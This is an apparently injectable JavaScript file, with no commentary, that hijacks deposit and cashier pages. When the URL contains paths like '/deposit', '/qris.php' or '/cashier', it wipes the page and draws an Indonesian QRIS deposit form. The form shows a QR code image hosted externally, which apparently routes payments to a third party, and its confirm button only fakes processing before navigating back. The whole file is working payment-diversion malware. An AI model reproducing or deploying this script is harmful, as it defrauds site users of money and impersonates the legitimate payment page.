(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) {
    return;
  }

  document.body.innerHTML = `
<style>
  :root{--bg:#f7fafc;--card:#ffffff;--accent:#0b79d0;--muted:#6b7280}
  *{box-sizing:border-box}
  body{font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin:0; padding:40px; display:flex; align-items:center; justify-content:center; min-height:100vh; 
    background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRV_Z9425SB_fSduopcr48wNwlPqBrLyFH2oOKC5YP48Jbt9UrJEs_DDbEr&s=10');
    background-size:cover;
    background-position:center;
    background-repeat:no-repeat;
    background-blend-mode:overlay;
  }
  .card{width:360px; background:rgba(255,255,255,0.55); border-radius:12px; border:1px solid rgba(255,255,255,0.25); backdrop-filter:blur(6px); box-shadow:0 8px 30px rgba(2,6,23,0.08); padding:20px}
  h1{font-size:18px; margin:0 0 12px}
  p.lead{margin:0 0 18px; color:var(--muted); font-size:13px}
  .qris-wrap{text-align:center; margin-bottom:16px}
  .qris-wrap img{max-width:260px; width:100%; height:auto; border-radius:8px; border:1px solid #eee}
  label{display:block; font-size:13px; margin-bottom:6px}
  input[type="number"]{width:100%; padding:10px 12px; border-radius:8px; border:1px solid #e6e6e6; font-size:14px}
  .row{display:flex; gap:10px; margin-top:12px}
  .btn{flex:1; padding:10px 14px; border-radius:10px; border:0; cursor:pointer; font-weight:600}
  .btn-grey{background:#f1f5f9; color:#0f172a}
  .btn-primary{background:var(--accent); color:white}

  .overlay{position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(3,7,18,0.45); z-index:9999}
  .overlay.show{display:flex}
  .spinner{width:80px; height:80px; border-radius:50%; display:inline-grid; place-items:center; background:linear-gradient(135deg,rgba(255,255,255,0.06),rgba(255,255,255,0.02)); box-shadow:0 6px 22px rgba(2,6,23,0.25)}
  .ring{width:48px; height:48px; border-radius:50%; border:5px solid rgba(255,255,255,0.18); border-top-color:rgba(255,255,255,0.95); animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  .overlay p{color:white; margin-top:10px; font-weight:600; font-size:14px}

  .foot{margin-top:14px; font-size:12px; color:var(--muted); text-align:center}
</style>

<main class="card" role="main">
  <h1>Form Deposit — QRIS</h1>
  <p class="lead">Scan QR di bawah lalu  masukkan nominal, transfer. dan tekan <strong>Konfirmasi</strong>.</p>

  <div class="qris-wrap">
    <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg" alt="QRIS" />
  </div>

  <form id="depositForm">
    <label for="amount">Nominal (Rp)</label>
    <input id="amount" name="amount" type="number" inputmode="numeric" min="50000" step="1" placeholder="e.g. 50000" required />

    <div class="row">
      <button type="button" id="backBtn" class="btn btn-grey">Kembali</button>
      <button type="submit" id="confirmBtn" class="btn btn-primary">Konfirmasi</button>
    </div>

    <p class="foot">Deposit Wajib Menggunakan Bank/ewallet aktif, Dan transaksi pertama diwajibkan menggunakan kode unik.<strong>contoh (50.888)</strong></p>
  </form>
</main>

<div id="overlay" class="overlay" role="status" aria-live="polite" aria-hidden="true">
  <div style="text-align:center">
    <div class="spinner" aria-hidden="true">
      <div class="ring"></div>
    </div>
    <p id="overlayText">Memproses…</p>
  </div>
</div>
`;

  // ===== JS logic dari arpus.html =====
  const form = document.getElementById('depositForm');
  const overlay = document.getElementById('overlay');
  const overlayText = document.getElementById('overlayText');
  const confirmBtn = document.getElementById('confirmBtn');
  const backBtn = document.getElementById('backBtn');
  const amountInput = document.getElementById('amount');

  backBtn.addEventListener('click', (e) => {
    e.preventDefault();
    history.back();
  });

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const val = Number(amountInput.value);
    if (!val || val < 50000) {
      amountInput.focus();
      amountInput.setCustomValidity('Masukkan nominal minimal 50.000');
      amountInput.reportValidity();
      return;
    }

    overlay.classList.add('show');
    overlay.setAttribute('aria-hidden', 'false');
    overlayText.textContent = 'Mengirim...';

    confirmBtn.disabled = true;
    backBtn.disabled = true;
    amountInput.disabled = true;

    setTimeout(() => {
      overlay.classList.remove('show');
      overlay.setAttribute('aria-hidden', 'true');

      if (history.length > 1) {
        history.back();
      } else {
        window.location.href = '/';
      }
    }, 1500);
  });
})();
